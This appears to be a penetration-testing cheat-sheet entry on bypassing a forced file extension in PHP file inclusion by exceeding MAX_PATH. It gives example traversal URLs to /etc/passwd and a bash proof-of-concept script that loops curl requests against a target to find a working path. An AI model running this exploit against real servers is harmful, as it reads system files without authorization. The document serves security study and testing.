###Nullbyte Alternative via Exceeding MAX_PATH values
####Note, only vulnerable on PHP systems

It is possible to reach the MAX_PATH limit and hence trunacate the last few characters present in the file inclusion. For example, if a PHP application has the following URL `test.php?file=1` and in the source, **always** appends .txt at the end of the user input for the file parameter:

`test.php?file=../etc/passwd` would evaluate to `../etc/passwd.txt` in the current directory.
`test.php?file=../../../../../[redacted]../../etc/passwd` would evaluate to `../../../../../[redacted]../../etc/passwd` in the current directory without the .txt as the MAX_PATH limit is reached and the .txt is no longer included at the end.

PoC:
Usage: `bash poc.sh "http://192.168.0.51/test.php?file="`
```
#!/usr/local/bin/bash  
file='/etc/passwd'   
str=`php -r "echo str_repeat('/..', 300);"`  
for ((i=1; i <= 100 ; i++)) do  
pre=$pre'n'  
URL="$1$pre$str$file"  
response=`curl -kis $URL | egrep "^root" | wc -l`  
if [ $response = 1 ]; then  
echo "Found: $URL";  
fi  
done 
```
Further reading:

[Another Alternative for the Nullbyte](http://blog.ptsecurity.com/2010/08/another-alternative-for-null-byte.html)